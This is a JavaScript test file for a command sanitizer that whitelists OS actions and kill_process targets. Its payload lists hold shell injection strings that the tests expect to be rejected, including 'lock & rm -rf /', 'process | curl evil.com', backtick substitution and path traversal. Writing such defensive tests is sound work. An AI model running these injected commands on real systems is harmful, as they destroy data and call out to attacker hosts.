import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { sanitizeCommand, InvalidCommandError } from '../src/utils/sanitizer.js';
import { killProcess } from '../src/services/os.js';

describe('OS Command Sanitization', () => {
  test('permits valid whitelisted actions', () => {
    assert.doesNotThrow(() => sanitizeCommand('lock'));
    assert.doesNotThrow(() => sanitizeCommand('sleep'));
  });

  test('permits valid process target for kill_process (with and without .exe, lowercase, spaces)', () => {
    assert.doesNotThrow(() => sanitizeCommand('kill_process', 'notepad.exe'));
    assert.doesNotThrow(() => sanitizeCommand('kill_process', 'node'));
    assert.doesNotThrow(() => sanitizeCommand('kill_process', 'localsend'));
    assert.doesNotThrow(() => sanitizeCommand('kill_process', 'localsend.exe'));
    assert.doesNotThrow(() => sanitizeCommand('kill_process', 'LocalSend.EXE'));
    assert.doesNotThrow(() => sanitizeCommand('kill_process', 'Discord Canary.exe'));
    assert.doesNotThrow(() => sanitizeCommand('kill_process', '"localsend"'));
  });

  test('rejects shell injection attempts in action', () => {
    const payloads = [
      'lock & rm -rf /',
      'sleep; whoami',
      'lock | calc.exe',
      'lock && notepad'
    ];
    payloads.forEach(input => {
      assert.throws(
        () => sanitizeCommand(input),
        InvalidCommandError,
        `Expected ${input} to throw InvalidCommandError`
      );
    });
  });

  test('rejects shell injection attempts in kill target', () => {
    const maliciousTargets = [
      'notepad.exe & calc.exe',
      '..\\..\\payload',
      'explorer; shutdown',
      'process | curl evil.com',
      'localsend`calc`',
      'node$HOME'
    ];
    maliciousTargets.forEach(target => {
      assert.throws(
        () => sanitizeCommand('kill_process', target),
        InvalidCommandError,
        `Expected target ${target} to throw InvalidCommandError`
      );
    });
  });

  test('killProcess returns clean JSON status when target is not currently running without throwing', async () => {
    const result = await killProcess('nonexistent_dummy_process_12345');
    assert.equal(typeof result, 'object');
    assert.equal(result.success, false);
    assert.ok(typeof result.message === 'string');
    assert.ok(result.message.length > 0);
  });
});
